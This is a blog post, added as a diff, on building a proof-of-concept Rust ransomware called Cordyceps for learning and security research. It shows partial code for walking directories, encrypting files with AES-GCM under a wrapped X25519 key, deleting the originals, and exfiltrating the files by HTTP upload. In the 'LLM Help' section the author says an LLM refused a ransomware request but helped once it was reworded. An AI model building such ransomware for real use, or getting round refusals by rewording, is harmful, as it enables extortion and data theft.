@@ -1,0 +1,416 @@
+---
+title: "Cordyceps: The Making of Rust Ransomware"
+date: 2025-09-26
+description: "An educational Rust ransomware for security research."
+categories: ["dev"]
+image: "og-cordyceps-rust-ransomware.webp"
+---
+
+In my last two posts, [Rust for Security Engineers](/log/2025-rust-security-engineers/) 🦀 and [Reflections on Using LLMs to Learn Rust](/log/2025-reflections-llms-rust/) 🤖, I discussed why I decided to learn Rust and how I used LLMs to speed up the process. After reading [The Rust Programming Language](https://doc.rust-lang.org/book/), I set myself a challenge. Inspired by a teammate, I decided to build a ransomware proof-of-concept, [Cordyceps](https://github.com/lopes/cordyceps) ☣️, written entirely in Rust. I chose this (dubious) project because it requires extensive use of the standard library and community crates, and it touches on many practical areas: command-line parsing, filesystem operations, networking, and cryptography. In this post, I'll dissect Cordyceps, highlighting each of its constituent modules.
+
+::: {.callout-warning}
+Cordyceps is a proof-of-concept created for educational purposes to demonstrate how ransomware works. It is intended for security researchers and students. **Do NOT use this on any system or data you do not own or have explicit permission to test on.** Misusing this software can cause irreversible data loss and is likely illegal.
+:::
+
+::: {.callout-note}
+I won't dive into implementation details here. Check the code comments for in-depth explanations. This post is a complementary, high-level overview.
+:::
+
+::: {.callout-note}
+This post is based on [Cordyceps v0.8.0](https://github.com/lopes/cordyceps/releases/tag/v0.8.0). Future versions may change some behaviors described here.
+:::
+
+
+## Project Overview
+Before writing a single line of code, I defined the project's structure and goals. Cordyceps is a command-line application written in Rust that simulates ransomware behavior for educational purposes. The project is divided into six modules: `main`, `cli`, `core`, `crypto`, `net`, and `error`.
+
+- `main`: Application entry point.
+- `cli`: Command-line argument parsing.
+- `core`: Core orchestration logic.
+- `crypto`: Cryptographic operations and the `.zombie` file format.
+- `net`: Exfiltration of encrypted files to a remote server.
+- `error`: Custom error types for unified error handling.
+
+The application is modular and extensible; each module has a clear responsibility.
+
+
+## Modules
+Following Rust's best practices for organization, Cordyceps is structured into six modules. The `main` module boots the app, `cli` parses user intent, and `core` orchestrates operations, delegating tasks to the `crypto` and `net` modules. The `error` module provides shared error types. The diagram below provides a graphical overview, and in the following sections, we'll delve into each module in that order.
+
+```{mermaid}
+flowchart LR
+  A[User CLI] --> B[main]
+  B --> C[cli]
+  C --> D[core]
+  D --> E[crypto]
+  D --> F[net]
+```
+
+### main
+This is the application's entry point and its simplest module. It registers all other modules with the `mod` keyword and calls the function that runs the program. The `main.rs` file starts with documentation comments (`//!`), which `cargo doc` uses to build the project's documentation. It's a simple and elegant way to keep documentation right next to the code it describes.
+
+```rust
+fn main() {
+    env_logger::init();
+
+    if let Err(e) = cli::run() {
+        error!("Cordyceps error: {}", e);
+        std::process::exit(1);
+    }
+}
+```
+
+Pay special attention to `if let Err(e) = cli::run()`. This is a great example of Rust's ergonomics. This line runs the `run` function from our `cli` module (more on that soon). Just by reading it, we can infer that `run` returns a `Result<T, E>` and that we're only concerned with the `Err` variant. This `if` statement becomes the final backstop for any errors that bubble up from our application.
+
+If an error makes it this far, we log it and exit with a non-zero status code. Otherwise, the program finishes successfully.
+
+### cli
+This module handles parsing command-line arguments, creating the bridge between the user and the application's features. Note the `///` comments here; they work with `//!` to document specific parts of the code, all of which contribute to the project's documentation. Run `cargo doc --open` to see the magic 🪄.
+
+```rust
+#[derive(Parser, Debug)]
+#[command(...)]
+enum Cli {
+    Encrypt(EncryptArgs),
+    Decrypt(DecryptArgs),
+    Generate(GenerateArgs),
+}
+```
+
+This module uses attributes (`#[...]`) heavily. `#[derive(Parser, Debug)]` automatically implements the `Parser` and `Debug` traits for our `Cli` enum, allowing it to parse arguments and be printed for debugging with `{:?}`. We're using the excellent [clap](https://crates.io/crates/clap) crate here. The `#[command(...)]` macro provides metadata that `clap` uses to generate the `--help` message. The `env!` macro complements this by reading variables from `Cargo.toml`, which helps us avoid duplicating information and keeps things consistent.
+
+I've chosen `clap`'s declarative *derive* style because I find it ergonomic and idiomatic. These attributes are macros that expand into the necessary boilerplate code at compile time. `clap` transforms the variants of our `Cli` enum into subcommands. For each subcommand, we define a struct whose fields become the arguments for that command.
+
+```rust
+pub fn run() -> Result<(), AppError> {
+    let args = match Cli::try_parse() {
+        Ok(args) => args,
+        Err(e) => e.exit(),
+    };
+
+    info!("Arguments parsed and loaded");
+    debug!("Arguments: {:?}", args);
+
+    match args {
+        Cli::Encrypt(args) => sporulate(&args.path, &args.key, args.no_delete, &args.server),
+        Cli::Decrypt(args) => disinfect(&args.path, &args.key, args.no_delete),
+        Cli::Generate(args) => germinate(&args.path),
+    }
+}
+```
+
+The `run` function, called from `main`, returns a `Result<(), AppError>`. It starts by parsing the arguments. Thanks to the `Parser` trait, our `Cli` enum has a `try_parse` function. While we could propagate a parsing error to `main`, `clap` errors are best handled immediately. We want to show the user a helpful message and exit right away. The `match` statement does this perfectly: on success (`Ok`), the parsed arguments are stored in `args`; on failure (`Err`), `e.exit()` prints a user-friendly error and terminates the program.
+
+Finally, a `match` statement on `args` acts as a dispatcher, calling the appropriate function from the `core` module based on the subcommand the user chose.
+
+Putting it all together, here’s how we might use the application from the terminal:
+
+```sh
+# Generate a new key pair in the current directory
+cordyceps generate
+
+# Encrypt files in the 'data' directory and send them to a server
+cordyceps encrypt -p ./data -k main-public.key -s http://localhost:2673
+
+# Decrypt the files using your private key
+cordyceps decrypt -p ./data -k main-private.key
+```
+
+```rust
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use clap::Parser;
+
+    #[test]
+    fn test_encrypt_args_parsing() {
+        let args = Cli::parse_from([...]);
+
+        if let Cli::Encrypt(args) = args {
+            assert_eq!(args.path.to_str().unwrap(), "/tmp");
+            assert_eq!(args.key.to_str().unwrap(), "/var/main-public.key");
+            assert!(args.no_delete);
+            assert_eq!(args.server, Some("http://example.com:2673".to_string()));
+        } else {
+            panic!("Expected encrypt args");
+        }
+    }
+}
+```
+
+Finally, the `cli` module contains its own `tests` submodule. The `#[cfg(test)]` attribute tells Rust to compile this module only when running `cargo test`. I find this an excellent way to keep tests close to the code they are testing. Since tests don't run from a real command line, we use `Cli::parse_from` to simulate providing arguments and then assert that they were parsed correctly.
+
+### error
+Before we continue, let's take a breath and look at the `error` module 🧘. Error handling in Rust can be tricky because every error has a distinct type. To avoid a mess of error conversions, I created a dedicated module to define our own custom error types. This unifies all the different kinds of errors our dependencies can throw.
+
+Implementing the standard `Error` and `Display` traits involves some boilerplate, so I brought in the excellent [thiserror](https://crates.io/crates/thiserror) crate to help. Like `clap`, `thiserror` lets us add functionality declaratively with attributes.
+
+```rust
+#[derive(Error, Debug)]
+pub enum CryptoError {
+    #[error("I/O error: {0}")]
+    Io(#[from] io::Error),
+    // ...
+}
+
+#[derive(Error, Debug)]
+pub enum AppError {
+    #[error("Cryptographic operation failed: {0}")]
+    Crypto(#[from] CryptoError),
+		// ...
+}
+```
+
+We define two enums, `CryptoError` and `AppError`. Both derive `thiserror::Error` to handle the `Error` trait implementation. The `#[error(...)]` attribute implements the `Display` trait for us. The most powerful attribute here is `#[from]`, which implements the `From` trait. This allows Rust's `?` operator to automatically convert underlying error types into our custom ones, saving us from writing manual `map_err` calls everywhere.
+
+I won't detail every error variant, but the key takeaway is that if a function that can return an `io::Error` needs to return our `CryptoError`, the `#[from]` macro handles the conversion automatically.
+
+### core
+Fasten your seatbelts, because from here things start to get wild 💨. `core` is the module that implements our core operations, acting as Cordyceps's nervous system 🧠.
+
+```rust
+const EXCLUDED_DIRS: &[&str] = &["...", "..."];
+const EXCLUDED_FILES: &[&str] = &["...", "..."];
+
+static EXCLUDED_DIRS_SET: LazyLock<HashSet<&'static str>> =
+    LazyLock::new(|| EXCLUDED_DIRS.iter().copied().collect());
+
+static EXCLUDED_FILES_SET: LazyLock<HashSet<&'static str>> =
+    LazyLock::new(|| EXCLUDED_FILES.iter().copied().collect());
+```
+
+We start by defining constant lists of directories and files to exclude. We don't want to encrypt `.git` directories or temporary system files, for example. For performance, we use `&[&str]` (a slice of string literals) since the size is known at compile time.
+
+For even better performance, we convert these lists into `HashSet`s using `LazyLock`. This gives us O(1) lookups, which is much faster than iterating through a list every time we check a file. The `LazyLock` ensures the `HashSet` is built only on its first use, not at program startup.
+
+```rust
+#[tokio::main]
+pub async fn sporulate(
+    path: &Path,
+    key: &Path,
+    no_delete: bool,
+    server: &Option<String>,
+) -> Result<(), AppError> {
+    // ...
+```
+
+Next is our first core function: `sporulate`. It's responsible for spreading the Cordyceps spores—that is, encrypting, exfiltrating, and deleting files. It's an `async` function because uploading files is an I/O-bound operation that benefits from asynchronous handling. The `#[tokio::main]` attribute provides a small, single-threaded [tokio](https://crates.io/crates/tokio) runtime for the function it decorates. When `cli::run()` calls `sporulate`, it blocks until the async operations are complete.
+
+```rust
+let walker = WalkDir::new(path)
+    .into_iter()
+    .filter_entry(|entry| {...})
+    .filter_map(Result::ok)
+    .filter(|entry| entry.file_type().is_file());
+```
+
+Inside `sporulate`, we build an iterator with the [walkdir](https://crates.io/crates/walkdir) crate to traverse the directory tree. The `.filter_map(Result::ok)` part is a concise way to discard any errors that occur while iterating (e.g., permission errors) and keep only the valid directory entries. A `for` loop then consumes this iterator. Each step (encrypt, delete, exfiltrate) can fail. Instead of stopping the entire process, we catch any error, log it, and move on to the next file.
+
+```rust
+pub fn disinfect(
+    path: &Path,
+    key: &Path,
+    no_delete: bool
+) -> Result<(), AppError> {
+		// ...
+```
+
+As its name suggests, `disinfect` reverses the `sporulate` process. It traverses directories looking for `.zombie` files and passes them to the `decrypt` function in the `crypto` module.
+
+```rust
+pub fn germinate(
+		path: &Path
+) -> Result<(), AppError> {
+		// ...
+```
+
+The last of our core functions is `germinate`. This function generates a Curve25519 key pair for our encryption and decryption routines. The cryptography details are explained in the `docs/cryptography.md` file in the Cordyceps' repository, but we'll look at the implementation here.
+
+```rust
+let (private_key, public_key) = generate_keypair()?;
+```
+
+`germinate` calls `crypto::generate_keypair`. Rust destructures the returned tuple, assigning each part to a variable. We then encode the keys to Base64 and write them to `main-private.key` and `main-public.key`.
+
+```rust
+let decoded_prikey = b64_decode(&private_key_b64)?;
+if decoded_prikey != *private_key.as_bytes() {
+		return Err(AppError::Crypto(CryptoError::KeyVerification));
+}
+```
+
+Since key generation is a crucial step, we verify that the process is reversible by decoding the keys and comparing them to the originals. If the check fails, we return an error immediately. Otherwise, the function returns `Ok(())` to signal success.
+
+### crypto
+This is the densest and arguably most complex module in Cordyceps. As the name suggests, `crypto` implements all cryptographic routines. This is a complex topic, fully documented in `docs/cryptography.md`. This section will build on that documentation, focusing on the implementation details rather than the cryptographic theory.
+
+```rust
+use aes_gcm::{
+    Aes256Gcm,
+    aead::{Aead, KeyInit, Nonce},
+};
+use base64::{Engine, engine::general_purpose::STANDARD_NO_PAD};
+use hkdf::Hkdf;
+use log::{debug, info};
+use rand::{RngCore, rngs::OsRng};
+use x25519_dalek::{EphemeralSecret, PublicKey, StaticSecret};
+```
+
+We start by importing several specialized crates. [aes_gcm](https://crates.io/crates/aes_gcm) provides our symmetric encryption algorithm. [hkdf](https://crates.io/crates/hkdf) implements a key derivation function. [rand](https://crates.io/crates/rand) gives us cryptographically secure random numbers. And [x25519_dalek](https://crates.io/crates/x25519_dalek) implements the Elliptic-Curve Cryptography for our public-key scheme.
+
+```rust
+struct ZombieHeader {
+    ephemeral_public_key: PublicKey,
+    encrypted_file_aes_key_with_tag: [u8; 48],
+    key_enc_aes_nonce: Nonce<Aes256Gcm>,
+    file_aes_nonce: Nonce<Aes256Gcm>,
+}
+
+impl ZombieHeader {
+    const HEADER_SIZE: usize = 4 + 1 + 32 + 48 + 12 + 12;
+
+    fn write_to<W: Write>(&self, mut writer: W) -> Result<(), io::Error> {
+        // ...
+    }
+
+    fn from_reader<R: Read>(mut reader: R) -> Result<Self, CryptoError> {
+        // ...
+    }
+}
+```
+
+I'm particularly proud of the logic for processing the `.zombie` file header, which makes great use of Rust's generics. The `ZombieHeader` struct defines the fields that will be serialized into the file header. We then implement two methods on it: `write_to` and `from_reader`.
+
+Notice the function signature: `fn write_to<W: Write>(&self, mut writer: W)`. By using a generic type `W` that is bound by the `io::Write` trait, this function can write the header to any destination that implements `Write`—a file, a network socket, or even an in-memory buffer. This separates our serialization logic from the I/O implementation.
+
+```rust
+let mut file = File::open(path)?;
+let file_size =
+		usize::try_from(file.metadata()?.len()).map_err(|_| CryptoError::FileTooLarge)?;
+let mut plaintext = Vec::with_capacity(file_size);
+file.read_to_end(&mut plaintext)?;
+debug!("Read {} bytes from {:?}", plaintext.len(), path);
+```
+
+In the `encrypt` function, we start by reading the entire file into a byte vector in memory. When converting the file length to a `usize`, we use `map_err` to provide a more specific error. The original `TryFromIntError` is too generic; we want to be explicit that the failure was due to the file being too large.
+
+```rust
+let mut random_bytes = [0u8; 56]; // 32 bytes key + 12 bytes nonce + 12 bytes key-enc nonce
+OsRng.try_fill_bytes(&mut random_bytes)?;
+
+let file_aes_key_bytes: [u8; 32] = random_bytes[..32].try_into().unwrap();
+let file_aes_nonce_bytes: [u8; 12] = random_bytes[32..44].try_into().unwrap();
+let key_enc_aes_nonce_bytes: [u8; 12] = random_bytes[44..].try_into().unwrap();
+
+let file_aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&file_aes_key_bytes);
+let cipher_file_aes_gcm = Aes256Gcm::new(file_aes_key);
+let file_aes_nonce = Nonce::<Aes256Gcm>::from_slice(&file_aes_nonce_bytes);
+```
+
+This block generates all the random data we need for one encryption operation. We fill a byte array from a cryptographically secure random number generator (`OsRng`). Then, we take slices of this array to get our file encryption key and nonces. This is efficient as it minimizes calls to the OS for random data. The `try_fill_bytes` function works on a mutable reference (`&mut`), modifying the `random_bytes` array in place without taking ownership.
+
+```rust
+let ephemeral_private = EphemeralSecret::random_from_rng(OsRng);
+let ephemeral_public = PublicKey::from(&ephemeral_private);
+// ...
+
+let shared_secret = ephemeral_private.diffie_hellman(public_key);
+
+let hkdf = Hkdf::<sha2::Sha256>::new(None, shared_secret.as_bytes());
+// ...
+hkdf.expand(b"key_encapsulation_aes_key_derivation", &mut key_enc_aes_key_derived_bytes)
+```
+
+Next, we implement an ECIES-like key encapsulation scheme. We generate a new, one-time-use (ephemeral) key pair. The ephemeral private key is combined with the user's main public key via a Diffie-Hellman key exchange to produce a shared secret. It's bad practice to use a raw shared secret as an encryption key, so we pass it through an HKDF to derive a strong AES key. This derived key is then used to encrypt the file's AES key.
+
+The beauty of this scheme is that the recipient can re-derive the exact same shared secret using their main private key and the ephemeral public key, which we store in the `.zombie` file's header. See `docs/cryptography.md` for a diagram on this scheme.
+
+```rust
+let plaintext = cipher_file_aes_gcm
+    .decrypt(...)
+    .map_err(|e| {
+        if e == aes_gcm::aead::Error {
+            CryptoError::AuthenticationTag
+        } else {
+            CryptoError::Decryption(...)
+        }
+    })?;
+```
+
+The `decrypt` function reverses this process. It reads the header, re-derives the shared secret, decrypts the file key, and finally decrypts the file content. AES-GCM is an AEAD cipher, which means it provides authentication in addition to confidentiality. The GCM authentication tag ensures the data hasn't been tampered with. If the tag is invalid, our `map_err` logic catches the specific error and returns our custom `CryptoError::AuthenticationTag`, preventing the program from using corrupted data.
+
+### net
+The `net` module is responsible for exfiltration, uploading the encrypted `.zombie` files over HTTP.
+
+```rust
+pub async fn upload_file(
+    client: &Client,
+    base_url: &str,
+    local_path: &Path,
+) -> Result<u16, AppError> {
+// ...
+```
+
+`upload_file` is an `async` function, which is essential for network-bound applications. While Cordyceps doesn't yet upload files concurrently, this function is ready for it. On success, it returns the HTTP status code as a `u16`.
+
+```rust
+let mut sanitized_file_name = String::with_capacity(file_name.len());
+for c in file_name.chars() {
+    if c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_') {
+        sanitized_file_name.push(c);
+    }
+}
+```
+
+To make the upload process more resilient, we sanitize filenames. This avoids issues with special characters or OS-specific naming rules by allowing only a safe subset of ASCII characters.
+
+```rust
+let file_content = fs::read(local_path).await?;
+
+let file_part = multipart::Part::bytes(file_content)
+		.file_name(final_file_name)
+		.mime_str("application/octet-stream")?;
+let form = multipart::Form::new().part("files", file_part);
+
+let response = client.post(&url).multipart(form).send().await?;
+```
+
+This code prepares a standard `multipart/form-data` request. We load the entire file into memory and wrap it in a `reqwest::multipart::Part`. This `Part` is then added to a `Form`, which is sent as the request body. As noted in the code's TODOs, a better practice for large files would be to stream the file from disk rather than loading it all into memory. Wrapping the content in a `Part` is a convenient abstraction that [reqwest](https://crates.io/crates/reqwest) provides, simplifying the process of building the multipart request.
+
+
+## LLM Help
+I used multiple LLMs to brainstorm features and code ideas. Interestingly, when I asked an LLM to "help me design a ransomware," it immediately answered, *"I can't do that."* However, asking it to "help me design a program that encrypts files in batch and sends them over the network" was enough to get helpful guidance. In this sense, they acted as useful assistants, providing insights ranging from needed documentation to good crates to use. When it came to coding, they provided invaluable insights on things like how to use a given crate or how to make the code more efficient, like suggesting `HashSet` for exclusion lists.
+
+However, I always treated LLM output as suggestions, not as authoritative code to be blindly pasted. My workflow was:
+1. Understand the proposed change.
+2. Type the suggested code (no editor integrations).
+3. Compile and fix issues raised by the compiler.
+
+One recurring issue I found was that crate APIs sometimes change quickly, and LLMs occasionally referenced older versions. Since the model was trained with a previous version of that crate, it simply didn't know how the newest version worked. When that happened, I consulted the crate's documentation and community resources ([Stack Overflow](https://stackoverflow.com/), blogs) to reconcile the differences.
+
+A recurring risk is *vibe coding* 🌈: using LLM-generated code without understanding it. LLMs produce confident answers, which can amplify this problem. It's up to the developer to validate results and learn the underlying concepts. However, this same pitfall can be a double-edged sword for threat actors, as a non-skilled person is now able to leverage models to create their own version of malware, which significantly increases the threat landscape ⚠️.
+
+
+## Issues and TODOs
+During development, several improvements were identified, also marked as `TODO` in the code:
+
+### Performance
+- **Concurrent uploads**: `core::sporulate` uploads files sequentially. Using `tokio` tasks for concurrent uploads will reduce the total runtime.
+- **Parallel encryption/decryption**: Parallelize `sporulate`/`disinfect` to leverage multi-core systems.
+- **Streaming I/O**: Replace full-file reads in `crypto::encrypt`, `crypto::decrypt`, and `net::upload_file` with streaming to reduce memory usage and support large files.
+
+### Code Structure and Design
+- **Separation of concerns**: `crypto::encrypt` and `crypto::decrypt` mix crypto with file I/O. Splitting them improves testability.
+- **Generic key loading**: Replace `load_private_key` and `load_public_key` with a generic `load_key<K>(path: &Path)` to reduce code duplication.
+- **Key file format**: `germinate` writes raw Base64-encoded keys; adding contextual formatting (e.g., JSON) would make key files more robust.
+
+### Dependencies
+- **Deprecated crates**: This project uses some deprecated crates due to transitive dependencies—when a dependency of your dependency is outdated or has a conflict. Overcoming these issues is important to use the latest versions of these crates.
+
+
+## Conclusion
+Building **Cordyceps** was a challenging and rewarding way to learn Rust 💪. The project forced me to dive into Rust's module system, error handling, concurrency, and cryptographic primitives.
+
+Through this project, I learned in practice things I had read in *The Rust Programming Language* book and was able to experience some real-world issues, like transitive dependencies and error handling, realizing that Rust is not as perfect as some preach. I also discovered important crates in the Rust ecosystem that extend the language and simplify development. Implementing an ECIES-like scheme from scratch deepened my understanding of asymmetric and symmetric crypto interactions.
+
+In the end, I'm very satisfied with the results and looking forward to the next challenges in Rust. In some ways, I feel the language's restrictions make me a better programmer, and I'm eager to keep exploring it. A final note on LLMs: while they dramatically accelerate development and research, they also lower the barrier for less-skilled threat actors, expanding the threat landscape 👾. That's precisely why security teams must avoid preconceptions and leverage LLMs to improve detection, automate response, and harden defenses. 💡
